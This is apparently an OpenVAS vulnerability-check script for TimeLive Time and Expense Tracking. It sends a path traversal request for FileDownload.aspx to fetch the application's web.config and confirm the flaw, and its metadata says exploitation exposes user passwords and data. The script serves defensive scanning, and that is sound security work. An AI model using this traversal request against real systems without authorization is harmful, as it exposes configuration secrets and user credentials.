if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.902481" );
	script_version( "2021-09-01T07:45:06+0000" );
	script_tag( name: "last_modification", value: "2021-09-01 07:45:06 +0000 (Wed, 01 Sep 2021)" );
	script_tag( name: "creation_date", value: "2011-09-30 15:58:03 +0200 (Fri, 30 Sep 2011)" );
	script_tag( name: "cvss_base", value: "6.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:S/C:P/I:P/A:P" );
	script_name( "TimeLive Time and Expense Tracking Multiple Vulnerabilities" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/17900/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/view/105363/timelivetet-traversaldisclose.txt" );
	script_xref( name: "URL", value: "http://securityswebblog.blogspot.com/2011/09/timelive-time-and-expense-tracking-411.html" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2011 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_timelive_time_n_expense_tracking_detect.sc" );
	script_require_ports( "Services/www", 80 );
	script_mandatory_keys( "timelive/detected" );
	script_tag( name: "impact", value: "Successful exploitation will allow attacker to download the
  complete database of users information including email addresses, usernames
  and passwords and associated timesheet and expense data." );
	script_tag( name: "affected", value: "TimeLive Time and Expense Tracking version 4.2.1 and prior." );
	script_tag( name: "insight", value: "Multiple flaws are due to an error in 'FileDownload.aspx', when
  processing the 'FileName' parameter." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "summary", value: "The host is running TimeLive Time and Expense Tracking and is prone
  to multiple vulnerabilities." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	exit( 0 );
}
require("http_func.inc.sc");
require("port_service_func.inc.sc");
require("version_func.inc.sc");
tlPort = http_get_port( default: 80 );
if(!dir = get_dir_from_kb( port: tlPort, app: "TimeLive" )){
	exit( 0 );
}
url = NASLString( dir, "/Shared/FileDownload.aspx?FileName=..\\web.config" );
sndReq = http_get( item: url, port: tlPort );
rcvRes = http_send_recv( port: tlPort, data: sndReq );
if(ContainsString( rcvRes, "All Events" ) && ContainsString( rcvRes, "Logging Application Block" )){
	report = http_report_vuln_url( port: tlPort, url: url );
	security_message( port: tlPort, data: report );
}

